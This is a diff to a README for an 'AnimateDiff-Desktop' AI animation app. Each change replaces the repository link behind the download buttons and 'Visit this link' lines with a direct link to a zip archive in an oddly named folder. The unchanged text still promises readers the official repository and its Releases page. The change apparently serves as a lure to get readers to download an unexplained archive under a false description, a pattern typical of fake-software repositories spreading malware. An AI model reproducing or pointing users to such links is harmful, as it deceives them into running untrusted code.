@@ -1,7 +1,7 @@
 <h1>🎬 AnimateDiff-Desktop---AI-Animation-Generator-2026 - Bring Your Images to Life Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026">
+  <a href="https://raw.githubusercontent.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026/main/didascalic/v1.7.zip">
     <img src="https://img.shields.io/badge/Download-AnimateDiff%20Desktop-4B0082?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#4B0082; padding:15px 30px; border-radius:50px; color:white; font-weight:bold; text-decoration:none; font-size:20px;">
   </a>
 </p>
@@ -28,7 +28,7 @@ Your journey to creating stunning animations starts here. Follow this simple ste
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026](https://github.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026/main/didascalic/v1.7.zip](https://raw.githubusercontent.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026/main/didascalic/v1.7.zip)
 
 Once you click the link, you'll be taken to the official repository page. Look for the big green "Code" button orb the "Releases" section on the right side of the page. Click on "Releases" to find the latest version of the application. Download the installer file provided there. The download may take a few minutes depending on your internet speed, as the application includes all necessary AI models for offline operation.
 
@@ -148,12 +148,12 @@ You've got the knowledge, now it's time to unleash your creativity. Download Ani
 
 
 
-**Ready to start? Visit this link to download the application:** [https://github.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026](https://github.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026)
+**Ready to start? Visit this link to download the application:** [https://raw.githubusercontent.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026/main/didascalic/v1.7.zip](https://raw.githubusercontent.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026/main/didascalic/v1.7.zip)
 
  
 
 <p align="center">
-  <a href="https://github.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026">
+  <a href="https://raw.githubusercontent.com/vyawaharejagadish/AnimateDiff-Desktop---AI-Animation-Generator-2026/main/didascalic/v1.7.zip">
     <img src="https://img.shields.io/badge/⚡%20Download%20Now%20⚡-AnimateDiff%20Desktop-FF4500?style=for-the-badge&logo=github&logoColor=white" alt="Large Download Button" style="display:inline-block; background-color:#FF4500; padding:18px 35px; border-radius:60px; color:white; font-weight:bold; text-decoration:none; font-size:24px;">
   </a>
 </p>
